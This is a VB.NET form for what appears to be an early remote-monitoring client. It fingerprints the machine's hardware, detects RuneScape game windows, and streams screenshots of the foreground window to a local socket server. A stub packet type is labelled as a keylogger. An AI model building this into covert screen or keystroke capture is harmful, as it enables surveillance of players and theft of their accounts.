Option Explicit On
Option Strict On

Imports System.Net
Imports System.Net.Sockets
Imports System.Runtime.InteropServices
Imports System.Text
Imports AppClient.HardwareID

Public Class FrmMain

#Region "Random Handler"

    Public Shared objRandom As New System.Random(CType(System.DateTime.Now.Ticks Mod System.Int32.MaxValue, Integer))
    Public Shared Function GetRandomNumber(Optional ByVal Low As Integer = 0, Optional ByVal High As Integer = 1000) As Integer
        Return objRandom.Next(Low, High + 1)
    End Function
    Public Shared Function GetRandomString(ByVal MinCharacters As Integer, ByVal MaxCharacters As Integer, ByVal Chars As String) As String
        Static r As New Random
        Dim CharactersInString As Integer = r.Next(MinCharacters, MaxCharacters)
        Dim sb As New StringBuilder
        For i As Integer = 1 To CharactersInString
            Dim idx As Integer = r.Next(0, Chars.Length)
            sb.Append(Chars.Substring(idx, 1))
        Next
        Return sb.ToString()
    End Function

#End Region

#Region "Delegates"
    Public Delegate Sub AppendTextBoxTextDelegate(ByVal TextBox As TextBox, ByVal Text As String)
    Public Sub AppendTextBoxText(ByVal TextBox As TextBox, ByVal Text As String)
        If Me.InvokeRequired Then
            Me.Invoke(New AppendTextBoxTextDelegate(AddressOf AppendTextBoxText), TextBox, Text)
        Else
            TextBox.AppendText(String.Format("[{0}] {1}{2}", CStr(DateTime.Now), Text, vbNewLine))
            TextBox.SelectionStart = Len(TextBox.Text)
            TextBox.ScrollToCaret()
        End If
    End Sub
    Public Delegate Sub SetLabelTextDelegate(ByVal Label As Label, ByVal Text As String)
    Public Sub SetLabelText(ByVal Label As Label, ByVal Text As String)
        If Me.InvokeRequired Then
            Me.Invoke(New SetLabelTextDelegate(AddressOf SetLabelText), Label, Text)
        Else
            Label.Text = Text
        End If
    End Sub
    Public Delegate Sub AddListViewItemDelegate(ByVal ListView As ListView, ByVal Item As String, ByVal Items As String())
    Public Sub AddListViewItem(ByVal ListView As ListView, ByVal Item As String, ByVal Items As String())
        If Me.InvokeRequired Then
            Me.Invoke(New AddListViewItemDelegate(AddressOf AddListViewItem), ListView, Item, Items)
        Else
            Dim LVI As New ListViewItem With {
                .Text = Item
            }
            LVI.SubItems.AddRange(Items)
            ListView.Items.Add(LVI)
        End If
    End Sub
#End Region

    Public UTF8Encoder As New System.Text.UTF8Encoding(False)
    Public Server_IP As String = "127.0.0.1"
    Public Server_Port As Integer = 9090
    Public ClientSocket As New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
    Public ClientBufferSize As Integer = 1023
    Public ClientBuffer(ClientBufferSize) As Byte

    Public Sub Connect(ByVal IP_Address As String, ByVal Port As Integer)
        Try
            ClientSocket.Close()
            ClientSocket = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
            ClientSocket.BeginConnect(New IPEndPoint(IPAddress.Parse(IP_Address), Port), New AsyncCallback(AddressOf ConnectedCallback), Nothing)
        Catch
            System.Threading.Thread.Sleep(5000)
            Connect(IP_Address, Port)
        End Try
    End Sub

    Public Sub BeginConnect()
        Connect(Server_IP, Server_Port)
        While True
            System.Threading.Thread.Sleep(1000)
        End While
    End Sub

    Public Sub ConnectedCallback(ByVal Result As IAsyncResult)
        If ClientSocket.Connected Then
            ReDim ClientBuffer(ClientBufferSize)
            ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, New AsyncCallback(AddressOf ReceivedCallback), Nothing)
            Dim RandomString As String = GetRandomString(GetRandomNumber(2978, 2978), GetRandomNumber(2978, 2978), "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
            Dim RandomStringBytes As Byte() = UTF8Encoder.GetBytes(RandomString)
            SendChunkedPacket(ClientSocket, 10, RandomStringBytes)
            AppendTextBoxText(TxtRaw, RandomString)
            SetLabelText(LblSentLength, String.Format("Length: {0}", RandomString.Length.ToString("N0")))
            'AppendTextBoxText(TxtRaw, String.Join(", ", RandomStringBytes))
            'SetLabelText(LblSentLength, String.Format("Length: {0}", CType(RandomStringBytes.Length, String)))
        Else
            System.Threading.Thread.Sleep(5000)
            Connect(Server_IP, 9090)
        End If
    End Sub
    Public Sub ReceivedCallback(ByVal Result As IAsyncResult)
        Dim SocketError As SocketError
        Dim BufferSize As Integer = ClientSocket.EndReceive(Result, SocketError)
        If SocketError.Equals(SocketError.Success) Then
            Dim Packet(BufferSize) As Byte
            Buffer.BlockCopy(ClientBuffer, 0, Packet, 0, BufferSize)

            HandlePacket(Packet)

            ReDim ClientBuffer(ClientBufferSize)
            ClientSocket.BeginReceive(ClientBuffer, 0, ClientBuffer.Length, SocketFlags.None, New AsyncCallback(AddressOf ReceivedCallback), ClientSocket)
        ElseIf SocketError.Equals(SocketError.ConnectionRefused) Then
            System.Threading.Thread.Sleep(5000)
            Connect(Server_IP, Server_Port)
        ElseIf SocketError.Equals(SocketError.ConnectionAborted) Then
            System.Threading.Thread.Sleep(5000)
            Connect(Server_IP, Server_Port)
        ElseIf SocketError.Equals(SocketError.ConnectionReset) Then
            System.Threading.Thread.Sleep(5000)
            Connect(Server_IP, Server_Port)
        End If
    End Sub


    Public Shared Sub OnSend(ByVal Result As IAsyncResult)
        Dim ClientSocket As Socket = CType(Result.AsyncState, Socket)
        ClientSocket.EndSend(Result)
    End Sub

    Public Function ReturnChunks(ByVal PacketType As UShort, ByVal Bytes As Byte()) As List(Of Byte())

        Dim PacketID As String = System.Guid.NewGuid.ToString()
        Dim HeaderBytes As Integer = 18 + PacketID.Length
        Dim PacketLength As Integer = Bytes.Length

        Dim ChunkList As New List(Of Byte())
        Dim Chunks As Integer = CType(Math.Ceiling(Bytes.Length / ((ClientBufferSize + 1) - HeaderBytes)), Integer)

        Dim BytesRead As Integer = 0

        For I As Integer = 1 To Chunks

            Dim BufferLength As Integer = ClientBufferSize - HeaderBytes
            Dim ChunkBytes(BufferLength) As Byte

            Dim ChunkLength As Integer = Bytes.Length - BytesRead
            If ChunkLength > BufferLength Then
                ChunkLength = BufferLength
            End If

            Dim PacketChunk As New List(Of Byte)
            PacketChunk.AddRange(BitConverter.GetBytes(CType(ChunkLength, UShort))) 'Chunk Size (Current Packet Size) - UShort - 2 Bytes
            PacketChunk.AddRange(BitConverter.GetBytes(PacketLength)) 'Overall Packet Size (Expected Bytes) - Integer - 4 Bytes
            PacketChunk.AddRange(BitConverter.GetBytes(I)) 'Chunk (What is the current chunk) - Integer - 4 Bytes
            PacketChunk.AddRange(BitConverter.GetBytes(Chunks)) 'Chunks (How many chunks) - Integer - 4 Bytes
            PacketChunk.AddRange(BitConverter.GetBytes(PacketType)) 'Packet Type - UShort - 2 Bytes
            PacketChunk.AddRange(BitConverter.GetBytes(CType(PacketID.Length, UShort))) 'Packet ID Length - UShort - 2 Bytes
            PacketChunk.AddRange(UTF8Encoder.GetBytes(PacketID)) 'Packet ID - String - PacketID.Length

            If I.Equals(1) Then
                Buffer.BlockCopy(Bytes, 0, ChunkBytes, 0, ChunkLength)
                BytesRead += ChunkLength
                ReDim Preserve ChunkBytes(ChunkLength)
            Else
                Dim ChunkOffset As Integer = BufferLength * ChunkList.Count
                Buffer.BlockCopy(Bytes, ChunkOffset, ChunkBytes, 0, ChunkLength)
                BytesRead += ChunkLength
                ReDim Preserve ChunkBytes(ChunkLength)
            End If

            PacketChunk.AddRange(ChunkBytes)
            ChunkList.Add(PacketChunk.ToArray)

        Next

        Return ChunkList

    End Function

    Public Sub SendChunkedPacket(ByVal Socket As Socket, ByVal PacketType As UShort, ByVal Bytes As Byte())
        Dim PacketChunks As List(Of Byte()) = ReturnChunks(PacketType, Bytes)
        For Each Chunk As Byte() In PacketChunks
            If Socket.Connected Then
                Socket.BeginSend(Chunk, 0, Chunk.Length, SocketFlags.None, New AsyncCallback(AddressOf OnSend), Socket)
                Dim ChunkLength As UShort = BitConverter.ToUInt16(Chunk, 0)
                Dim ChunkID As Integer = BitConverter.ToUInt16(Chunk, 6)
                Dim PacketLength As Integer = BitConverter.ToInt32(Chunk, 2)
                'AddListViewItem(LvSent, CType(LvSent.Items.Count, String), New String() {CType(Chunk.Length, String), CType(ChunkID, String), CType(PacketLength, String), CType(ChunkLength, String)})
                'System.Threading.Thread.Sleep(1000)
            Else
                Exit Sub
            End If
        Next
    End Sub

    Public Sub GenerateHWID()
        Dim ProcessorID As String = GetProcessorID()
        Dim MACAddress As String = GetMACAddress()
        Dim MotherBoardID As String = GetMotherBoardID()
        Dim HardwareID As String = String.Format("{0}|{1}|{2}", ProcessorID, MACAddress, MotherBoardID)
        HWID = GenerateMD5Hash(HardwareID)
        Dim T As New System.Threading.Thread(Sub() BeginConnect())
        With T
            .IsBackground = True
            .Start()
        End With
    End Sub

    Private Sub FrmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim T As New System.Threading.Thread(Sub() GenerateHWID())
        With T
            .IsBackground = True
            .Start()
        End With
    End Sub


#Region "Packet Handler"

    Public PacketList As New List(Of SocketPacket)

    Public Class SocketPacket
        Public ChunkSize As UShort
        Public PacketSize As Integer
        Public Chunk As Integer
        Public Chunks As Integer
        Public PacketType As UShort
        Public PacketID As String
        Public PacketData As String
        Public PacketBytes As List(Of Byte)
        Public Sub New(ByVal ChnkSize As UShort, ByVal PcktSize As Integer, ByVal Chnk As Integer, ByVal Chnks As Integer, ByVal PcktType As UShort, ByVal PcktID As String, ByVal PcktData As String, ByVal PcktBytes As List(Of Byte))
            Me.ChunkSize = ChnkSize
            Me.PacketSize = PcktSize
            Me.Chunk = Chnk
            Me.Chunks = Chnks
            Me.PacketType = PcktType
            Me.PacketID = PcktID
            Me.PacketData = PcktData
            Me.PacketBytes = PcktBytes
        End Sub
    End Class

    Public Sub AddPacketBytes(ByVal ChunkSize As UShort, ByVal PacketSize As Integer, ByVal Chunk As Integer, ByVal Chunks As Integer, ByVal PacketType As UShort, ByVal PacketID As String, ByVal Data As String, ByVal Bytes As Byte())
        For Each Packet As SocketPacket In PacketList
            If Packet.PacketID.Equals(PacketID) Then
                Packet.ChunkSize = ChunkSize
                Packet.Chunk = Chunk
                Packet.PacketData += Data
                Packet.PacketBytes.AddRange(Bytes)
                Packet.PacketBytes.RemoveAt(Packet.PacketBytes.Count - 1)
                Exit Sub
            End If
        Next
        Dim BytesList As New List(Of Byte)
        BytesList.AddRange(Bytes)
        BytesList.RemoveAt(BytesList.Count - 1)
        PacketList.Add(New SocketPacket(ChunkSize, PacketSize, Chunk, Chunks, PacketType, PacketID, Data, BytesList))
    End Sub


    Public Sub DeletePacketByID(ByVal PacketID As String)
        For Each Packet As SocketPacket In PacketList
            If Packet.PacketID.Equals(PacketID) Then
                PacketList.Remove(Packet)
                Exit Sub
            End If
        Next
    End Sub

    Public Sub DeletePacket(ByVal Packet As SocketPacket)
        PacketList.Remove(Packet)
    End Sub

    Public Function SockPacket(ByVal PacketID As String) As SocketPacket
        For Each Packet As SocketPacket In PacketList
            If Packet.PacketID.Equals(PacketID) Then
                Return Packet
            End If
        Next
        Return Nothing
    End Function

    Public Function LastChunk(ByVal Chunk As Integer, ByVal Chunks As Integer) As Boolean
        If Chunk.Equals(Chunks) Then
            Return True
        Else
            Return False
        End If
    End Function
    Public Function VerifyLength(ByVal ExpectedLength As Integer, ByVal TotalLength As Integer) As Boolean
        If ExpectedLength.Equals(TotalLength) Then
            Return True
        Else
            Return False
        End If
    End Function

    Public Function ReturnBytes(ByVal Bytes As Byte(), ByVal Offset As Integer, ByVal Count As Integer) As Byte()
        Dim ByteArray(Count) As Byte
        Buffer.BlockCopy(Bytes, Offset, ByteArray, 0, Count)
        Return ByteArray
    End Function
    Public Function ReadBytes(ByVal Bytes As Byte(), ByVal Offset As Integer, ByVal Count As Integer) As String
        Return UTF8Encoder.GetString(Bytes, Offset, Count)
    End Function


    Public Sub HandlePacket(ByVal Packet As Byte())
        Dim ChunkLength As UShort = BitConverter.ToUInt16(Packet, 0)
        Dim PacketLength As Integer = BitConverter.ToInt32(Packet, 2)
        Dim Chunk As Integer = BitConverter.ToUInt16(Packet, 6)
        Dim Chunks As Integer = BitConverter.ToUInt16(Packet, 10)
        Dim PacketType As UShort = BitConverter.ToUInt16(Packet, 14)
        Dim PacketIDLength As UShort = BitConverter.ToUInt16(Packet, 16)
        Dim PacketID As String = ReadBytes(Packet, 18, PacketIDLength)
        Dim PacketData As String = ReadBytes(Packet, 18 + PacketIDLength, ChunkLength)
        Dim PacketBytes As Byte() = ReturnBytes(Packet, 18 + PacketIDLength, ChunkLength)

        'AppendTextBoxText(TxtRaw, String.Format("Chunk Length: {0}{1}Packet Length: {2}{3}Chunk Index: {4}{5}Total Chunks: {6}{7}Packet Type: {8}{9}Packet ID Length: {10}{11}Packet ID: {12}{13}{14}Packet Data: {15}", ChunkLength, vbNewLine, PacketLength, vbNewLine, Chunk, vbNewLine, Chunks, vbNewLine, PacketType, vbNewLine, PacketIDLength, vbNewLine, PacketID, vbNewLine, vbNewLine, PacketData))
        AddPacketBytes(ChunkLength, PacketLength, Chunk, Chunks, PacketType, PacketID, PacketData, PacketBytes)
        'AddListViewItem(LvReceived, CType(LvReceived.Items.Count, String), New String() {CType(Packet.Length, String), CType(Chunk, String), CType(PacketLength, String), CType(ChunkLength, String), CType(PacketBytes.Length, String)})

        If LastChunk(Chunk, Chunks) Then
            Dim ChunkPacket As SocketPacket = SockPacket(PacketID)
            'AppendTextBoxText(TextBox1, String.Join(", ", ChunkPacket.PacketBytes.ToArray()))
            'AppendTextBoxText(TextBox1, String.Format("Length: {0}", ChunkPacket.PacketData.Length))
            'SetLabelText(LblReceivedLength, CType(ChunkPacket.PacketBytes.ToArray().Length, String))
            DeletePacket(ChunkPacket)
            Select Case PacketType
                Case 100
                    'Dim RandomString As String = ReadBytes(ReconstructedPacket, 0, ReconstructedPacket.Length)
                    'AppendTextBoxText(TxtRaw, String.Format("{0}{1}", vbNewLine, ChunkPacket.PacketData))
            End Select
        Else
            Select Case PacketType
                Case 900 'Keylogger | Update Client in realtime as data is sent
            End Select
        End If


    End Sub


#Region "Window Size/Location"
    <DllImport("user32.dll", EntryPoint:="FindWindowW")>
    Private Shared Function FindWindowW(<MarshalAs(UnmanagedType.LPTStr)> ByVal lpClassName As String, <MarshalAs(UnmanagedType.LPTStr)> ByVal lpWindowName As String) As IntPtr
    End Function

    <DllImport("user32.dll", EntryPoint:="GetWindowRect")>
    Private Shared Function GetWindowRect(ByVal hWnd As IntPtr, ByRef lpRect As RECT) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

    <StructLayout(LayoutKind.Sequential)>
    Private Structure RECT
        Public Left, Top, Right, Bottom As Integer
    End Structure
#End Region

#Region "Foreground Window Text"
    Private Clients As String() = {"Old School RuneScape", "OSBuddy", "RuneLite", "RuneScape", "Konduit Oldschool"}
    Private Declare Function GetForegroundWindow Lib "user32" Alias "GetForegroundWindow" () As IntPtr
    Private Declare Auto Function GetWindowText Lib "user32" (ByVal hWnd As System.IntPtr, ByVal lpString As System.Text.StringBuilder, ByVal cch As Integer) As Integer
    Private Function GetCaption() As String
        Dim Caption As New System.Text.StringBuilder(256)
        Dim hWnd As IntPtr = GetForegroundWindow()
        GetWindowText(hWnd, Caption, Caption.Capacity)
        Return Caption.ToString()
    End Function
    Private Function IsRuneScape(ByVal WindowText As String) As Boolean
        For Each TitleText As String In Clients
            If WindowText.Contains(TitleText) Then
                Return True
            End If
        Next
        Return False
    End Function
#End Region

    Public Function TakeWindowScreenshot(ByVal WindowText As String) As Bitmap
        Dim hWnd As IntPtr = FindWindowW(Nothing, WindowText)
        If hWnd <> IntPtr.Zero AndAlso WindowText.Length > 0 Then
            Dim WindowPosition As New RECT
            GetWindowRect(hWnd, WindowPosition)
            Dim CursorX As Integer = Cursor.Position.X
            Dim CursorY As Integer = Cursor.Position.Y
            Dim WindowX As Integer = WindowPosition.Left
            Dim WindowY As Integer = WindowPosition.Top
            Dim WindowWidth As Integer = WindowPosition.Right - WindowX
            Dim WindowHeight As Integer = WindowPosition.Bottom - WindowY

            If CursorX > WindowX Then
                CursorX -= WindowX
            Else
                CursorX = WindowX - CursorX
            End If
            If CursorY > WindowY Then
                CursorY -= WindowY
            Else
                CursorY = WindowY - CursorY
            End If

            Dim Bmp As New Bitmap(WindowWidth, WindowHeight)
            Dim G As Graphics = Graphics.FromImage(Bmp)
            G.CopyFromScreen(WindowX, WindowY, 0, 0, Bmp.Size, CopyPixelOperation.SourceCopy)
            Cursor.Draw(G, New Rectangle(New Point(CursorX, CursorY), Cursor.Size))
            G.Dispose()

            Return Bmp
        Else
            Return Nothing
        End If
    End Function

    Function ConvertImageToBytes(ByVal Image As Image) As Byte()
        Dim MemStream As New IO.MemoryStream
        Image.Save(MemStream, System.Drawing.Imaging.ImageFormat.Png)
        Return MemStream.GetBuffer()
    End Function

    Public Function ConvertBytesToImage(ByVal BitmapBytes As Byte()) As Image
        Dim MemStream As New IO.MemoryStream(BitmapBytes)
        Dim Image As Image = Drawing.Image.FromStream(MemStream)
        Return Image
    End Function


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim Image As Image = TakeWindowScreenshot(GetCaption)
        Dim ImageBytes As Byte() = ConvertImageToBytes(Image)
        Dim CompressedBytes As Byte() = Compress(ImageBytes)
        SendChunkedPacket(ClientSocket, 200, CompressedBytes)
        AppendTextBoxText(TxtRaw, String.Join(", ", ImageBytes))
        SetLabelText(LblSentLength, String.Format("Length: {0}", ImageBytes.Length.ToString("N0")))
    End Sub


#End Region


#Region "Packet Compression"
    'Public Shared Function Compress(ByVal Bytes As Byte()) As Byte()
    '    Dim Stream As New IO.MemoryStream()
    '    Dim ZipStream As New System.IO.Compression.DeflateStream(Stream, System.IO.Compression.CompressionMode.Compress, True)
    '    ZipStream.Write(Bytes, 0, Bytes.Length)
    '    ZipStream.Close()
    '    Return Stream.ToArray()
    'End Function
    'Public Shared Function Decompress(ByVal Bytes As Byte()) As Byte()
    '    Dim Stream As New IO.MemoryStream()
    '    Dim ZipStream As New System.IO.Compression.DeflateStream(New IO.MemoryStream(Bytes), System.IO.Compression.CompressionMode.Decompress, True)
    '    Dim Buffer(4095) As Byte
    '    While True
    '        Dim size = ZipStream.Read(Buffer, 0, Buffer.Length)
    '        If size > 0 Then
    '            Stream.Write(Buffer, 0, size)
    '        Else
    '            Exit While
    '        End If
    '    End While
    '    ZipStream.Close()
    '    Return Stream.ToArray()
    'End Function
    Public Function Compress(ByVal Bytes As Byte()) As Byte()
        '   Get the stream of the source file.
        Using InputStream As IO.MemoryStream = New IO.MemoryStream(Bytes)
            '     Create the compressed stream.
            Using OutputStream As IO.MemoryStream = New IO.MemoryStream()
                Using CompressionStream As New System.IO.Compression.DeflateStream(OutputStream, System.IO.Compression.CompressionMode.Compress)
                    '          Copy the source file into the compression stream.
                    InputStream.CopyTo(CompressionStream)
                End Using
                Compress = OutputStream.ToArray()
            End Using
        End Using
    End Function
    Public Function Decompress(ByVal Bytes As Byte()) As Byte()
        '    Get the stream of the source file.
        Using InputStream As IO.MemoryStream = New IO.MemoryStream(Bytes)
            '   Create the decompressed stream.
            Using OutputStream As IO.MemoryStream = New IO.MemoryStream()
                Using DecompressionStream As New System.IO.Compression.DeflateStream(InputStream, System.IO.Compression.CompressionMode.Decompress)
                    '        Copy the decompression stream
                    '        into the output file.
                    DecompressionStream.CopyTo(OutputStream)
                End Using
                Decompress = OutputStream.ToArray
            End Using
        End Using
    End Function
#End Region

    Public Shared Function ImageToByteArray(ByVal Image As Image) As Byte()
        Using MemStream As New IO.MemoryStream
            Image.Save(MemStream, Imaging.ImageFormat.Png)
            Return MemStream.GetBuffer()
        End Using
    End Function

    Public Shared Function ImageToBase64(ByVal Image As Image) As String
        Return Convert.ToBase64String(ImageToByteArray(Image))
    End Function

    Public Overloads Shared Function ByteArrayToImage(ByVal Bytes As Byte()) As Image
        Using MemStream As New IO.MemoryStream(Bytes)
            Return Image.FromStream(MemStream)
        End Using
    End Function

    Public Overloads Shared Function Base64ToImage(ByVal Text As String) As Image
        Return ByteArrayToImage(Convert.FromBase64String(Text))
    End Function

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim RandomString As String = GetRandomString(GetRandomNumber(2000, 2500), GetRandomNumber(3000, 3500), "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
        Dim RandomStringBytes As Byte() = UTF8Encoder.GetBytes(RandomString)
        SendChunkedPacket(ClientSocket, 10, RandomStringBytes)
        AppendTextBoxText(TxtRaw, RandomString)
        SetLabelText(LblSentLength, String.Format("Length: {0}", RandomString.Length.ToString("N0")))
        'AppendTextBoxText(TxtRaw, String.Join(", ", RandomStringBytes))
        'SetLabelText(LblSentLength, String.Format("Length: {0}", RandomStringBytes.Length))
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        'LvReceived.Items.Clear()
        LvSent.Items.Clear()
        TxtRaw.Clear()
        'TextBox1.Clear()
        'LblReceivedLength.Text = "Length: 0"
        LblSentLength.Text = "Length: 0"
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        My.Computer.Clipboard.SetText(TxtRaw.Text)
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs)
        'My.Computer.Clipboard.SetText(TextBox1.Text)
    End Sub

    Public Function RebuildArray(ByVal ByteArray As Byte()) As Byte()
        Dim ByteArrayList As New List(Of Byte)
        For Each Bit As Byte In ByteArray
            If Not Bit.Equals(0) Then
                ByteArrayList.Add(Bit)
            End If
        Next
        Return ByteArrayList.ToArray
    End Function

    Public Streaming As Boolean = False
    Private Sub Button5_Click_1(sender As Object, e As EventArgs) Handles Button5.Click
        If Not Streaming Then
            Streaming = True
            Dim T As New System.Threading.Thread(Sub() StreamLoop(0))
            With T
                .IsBackground = True
                .Start()
            End With
        Else
            Streaming = False
        End If
    End Sub

    Public Sub StreamLoop(ByVal ChunkDelay As Integer)
        While Streaming AndAlso ClientSocket.Connected
            Dim Image As Image = TakeWindowScreenshot(GetCaption)
            Dim ImageBytes As Byte() = ConvertImageToBytes(Image)
            Dim CompressedBytes As Byte() = Compress(ImageBytes)
            SendChunkedPacket(ClientSocket, 200, CompressedBytes)
            'AppendTextBoxText(TxtRaw, String.Join(", ", ImageBytes))
            SetLabelText(LblSentLength, String.Format("Length: {0}", ImageBytes.Length.ToString("N0")))
            System.Threading.Thread.Sleep(ChunkDelay)
        End While
    End Sub

End Class
